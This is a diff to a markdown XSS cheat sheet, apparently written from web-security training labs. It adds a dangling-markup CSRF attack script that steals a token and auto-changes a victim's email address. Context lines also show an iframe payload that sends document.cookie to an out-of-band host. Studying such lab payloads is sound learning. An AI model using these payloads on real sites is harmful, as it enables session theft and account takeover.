@@ -534,7 +534,54 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
 ```JavaScript
 <iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie>"></iframe>
 ```  
+### Reflected XSS protected by very strict CSP, with dangling markup attack
+> The application has a very strict content secure policy -> block almost everything
 
+![alt text](image.png)
+
+> However, HTML dangling is allowed, making it possible for us to inject a 'Click me' button which redirects victim to our exploit server (in reaility, we need to do social engineering to lure victims to click the button).
+
+> The payload below is divided into 2 parts. Initially, when victim click at the malicious link and is redirected to the change-email page, no token is found in the URL, therefore the script falls into the `else` branch (inject a button). After that when victim clicked the button and is redirected to the exploit page, the `<script>...</script>` runs again and falls into the `if` branch (because now the URL contains the token) and automatically send request to change email
+
+```html
+<script>
+// Define the URLs for the lab environment and the exploit server.
+const academyFrontend = "https://your-lab-url.net/"; //PASTE FULL URL HERE, NOT JUST ID
+const exploitServer = "https://your-exploit-server.net/exploit";
+
+// Extract the CSRF token from the URL.
+const url = new URL(location);
+const csrf = url.searchParams.get('csrf');
+
+// Check if a CSRF token was found in the URL.
+if (csrf) {
+    // If a CSRF token is present, create dynamic form elements to perform the attack.
+    const form = document.createElement('form');
+    const email = document.createElement('input');
+    const token = document.createElement('input');
+
+    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
+    token.name = 'csrf';
+    token.value = csrf;
+
+    // Configure the new email address intended to replace the user's current email.
+    email.name = 'email';
+    email.value = 'hacker@evil-user.net';
+
+    // Set the form attributes, append the form to the document, and configure it to automatically submit.
+    form.method = 'post';
+    form.action = `${academyFrontend}my-account/change-email`;
+    form.append(email);
+    form.append(token);
+    document.documentElement.append(form);
+    form.submit();
+
+    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
+} else {
+    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
+}
+</script>
+```
 ### Bypass Blocked Tags   
   
 >Application controls give message, ***"Tag is not allowed"*** when inserting basic XSS payloads, but discover SVG mark-up allowed using above [methodology](#identify-allowed-tags). This payload steal my own session cookie as POC.  
